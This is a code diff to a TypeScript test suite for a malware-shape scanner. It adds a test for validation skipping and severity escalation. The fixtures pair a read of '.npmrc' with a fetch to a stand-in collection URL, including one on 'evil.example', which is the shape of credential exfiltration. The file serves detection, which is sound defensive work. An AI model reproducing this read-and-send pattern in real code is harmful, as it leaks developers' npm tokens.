@@ -7,6 +7,7 @@ import { FLAG as SCRIPT } from '../../../src/phases/p353.js';
 
 afterEach(() => {
   delete process.env[phase.FLAG];
+  delete process.env[SCRIPT];
 });
 
 const shape: phase.MalwareShape = {
@@ -36,6 +37,23 @@ describe('phase 355', () => {
     expect(hit[0]?.message).toContain('not a named campaign');
     expect(phase.shapeFindings("fs.readFileSync('.npmrc');", [shape])).toEqual([]);
     expect(() => phase.reviewShapeGuard({ automation: true, reviewed: true })).toThrow(/human/);
+    delete process.env[SCRIPT];
+  });
+
+  it('skips a shape that fails validation and raises a reviewed match to high', () => {
+    process.env[phase.FLAG] = '1';
+    process.env[SCRIPT] = '1';
+    const source = "fs.readFileSync('.npmrc');\nfetch('https://example.invalid/collect');";
+    expect(phase.shapeFindings(source, [{ ...shape, fixtureUrl: 'https://evil.example/collect' }])).toEqual([]);
+    expect(phase.shapeFindings(source, [{ ...shape, fixtureUrl: 'not a url' }])).toEqual([]);
+    expect(phase.shapeFindings(source, [{ ...shape, fixtureUrl: undefined, reviewed: true, fp: '   ' }])).toEqual([]);
+    expect(phase.shapeFindings(source, [{ ...shape, fixtureUrl: undefined, source: '   ' }])).toEqual([]);
+    expect(phase.shapeFindings('fetch("https://example.invalid/collect");', [{ ...shape, parts: ['read-npmrc'] }])).toEqual([]);
+    const reviewed = phase.shapeFindings(source, [{ ...shape, reviewed: true }]);
+    expect(reviewed[0]?.severity).toBe('high');
+    const npmrcOnly = phase.shapeFindings("fs.readFileSync('.npmrc');", [{ ...shape, parts: ['read-npmrc'], fixtureUrl: undefined }]);
+    expect(npmrcOnly[0]?.severity).toBe('info');
+    expect(phase.reviewShapeGuard({ automation: false, reviewed: true })).toBeUndefined();
     delete process.env[SCRIPT];
   });
 });
